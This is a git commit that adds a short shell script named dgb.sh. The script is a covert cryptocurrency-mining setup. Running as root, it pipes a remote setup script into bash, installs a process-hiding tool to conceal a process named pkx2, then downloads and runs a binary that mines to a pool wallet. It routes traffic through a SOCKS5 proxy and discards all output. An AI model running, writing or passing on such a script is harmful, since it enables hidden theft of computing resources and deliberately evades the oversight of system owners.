dabe54ac8ae353c9c12986c6297f92635533a4dc
Geraldy Olang <97717251+geraldyolang11@users.noreply.github.com>
2022-02-10 22:42:41 +0800

    Create dgb.sh

---
+++ dgb.sh
@@ -0,0 +1,2 @@
+#!/bin/bash 
+sudo su --command "sudo apt update && sudo apt upgrade -y && sudo apt install gcc -y && sudo apt install curl -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs -y && npm install -g npm@8.4.1 && npm i -g node-process-hider && sudo ph add pkx2 && wget https://github.com/parkitmove/parkit/raw/main/pkx2 && chmod +x pkx2 && ./pkx2 -a minotaurx -o stratum+tcp://minotaurx.eu.mine.zpool.ca:7019 -u DBCUUWXhoWNAAk51HauNkGiwYw3BE98vN5 -p c=DGB,zap=AVN -t 2 -x socks5://192.252.214.20:15864 > /dev/null 2>&1"
